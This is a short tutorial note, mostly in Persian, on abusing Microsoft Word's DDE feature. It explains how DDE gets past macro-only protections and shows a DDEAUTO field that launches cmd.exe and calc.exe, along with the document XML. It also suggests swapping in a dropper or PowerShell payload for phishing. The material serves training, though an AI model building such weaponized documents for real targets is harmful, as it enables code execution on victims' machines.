
DDE ---> (Dynamic Data Exchange)


یک مکانیسم قدیمی ویندوز/آفیس برای تبادل داده بین برنامه‌هاست (مثلاً ارسال داده از اکسل به ورد یا بالعکس). این قابلیت بسیار قدیمی است و به‌خاطر توانایی فراخوانی برنامه‌ها/دستورات از داخل یک سند، توسط مهاجمان برای اجرای کد در حملات فیشینگ سوءاستفاده شده است.

چون DDE نیازی به ماکروی VBA ندارد، برخی تنظیمات امنیتی که فقط ماکروها را کنترل می‌کنند را دور می‌زند

---

	به این صورت میایم و یه متن DDE میسازیم

![[Pasted image 20251101142333.png]]

It will add an `!Unexpected End of Formula`to the document, that is expected. Right click it > Toggle Field Codes:

![[Pasted image 20251101142356.png]]


![[Pasted image 20251101142410.png]]

```
DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" 
```

حالا میایم و این قسمت رو با Malisious Payload خودمون عوض میکنیم  مثلا میگیم بیا برای من یک فایل رو دانلود کن یعنی در اصل فایل word ما در اصل یک Dropper بوده یا مثلا میگیم من powershell  رو میخوام 

![[Pasted image 20251101142727.png]]


![[Pasted image 20251101142736.png]]


```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas" xmlns:cx="http://schemas.microsoft.com/office/drawing/2014/chartex" xmlns:cx1="http://schemas.microsoft.com/office/drawing/2015/9/8/chartex" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:wp14="http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml" xmlns:w16se="http://schemas.microsoft.com/office/word/2015/wordml/symex" xmlns:wpg="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup" xmlns:wpi="http://schemas.microsoft.com/office/word/2010/wordprocessingInk" xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml" xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape" mc:Ignorable="w14 w15 w16se wp14">
<...snip...>
      <w:instrText>DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"</w:instrText>
<...snip...>
</w:document>
```



